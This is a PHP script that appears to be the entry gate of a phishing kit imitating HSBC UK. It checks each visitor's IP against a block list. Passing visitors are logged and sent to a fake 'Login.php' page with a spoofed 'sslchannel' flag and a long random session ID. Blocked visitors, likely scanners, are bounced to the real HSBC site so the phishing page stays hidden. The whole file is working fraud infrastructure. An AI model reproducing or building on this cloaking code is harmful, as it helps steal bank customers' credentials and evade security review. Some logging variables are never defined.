<?php
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function redirectTo($page, $lang = null)
{
    if (!$lang) {
        echo '<html><script language="javascript">var page = "' . $page . '"; top.location = page; </script></html>';
    } else { echo '<html><script language="javascript">var page = "' . $page . '?Locale=' . $lang . '"; top.location = page; </script></html>'; }
}
$ips = array(	$_SERVER['REMOTE_ADDR'],
				 );
$checklist = new IpBlockList( );
foreach ($ips as $ip ) {

	$result = $checklist->ipPass( $ip );

	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("../assets/logs/accepted_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);		
		session_start();
        $_SESSION['page_a_visited'] = true;
		redirectTo("Login.php?sslchannel=true&sessionid=" . generateRandomString(115));
	}
	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("../assets/logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
        header("Location: https://www.google.ie/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjl7oHQx6fLAhUBvRoKHUIGAvkQFggbMAA&url=https%3A%2F%2Fwww.hsbc.co.uk%2F&usg=AFQjCNHgssL48GufX82hDefuAgLxFpYtvg&bvm=bv.115339255,d.d2s");
		die();
	}
	
}

?>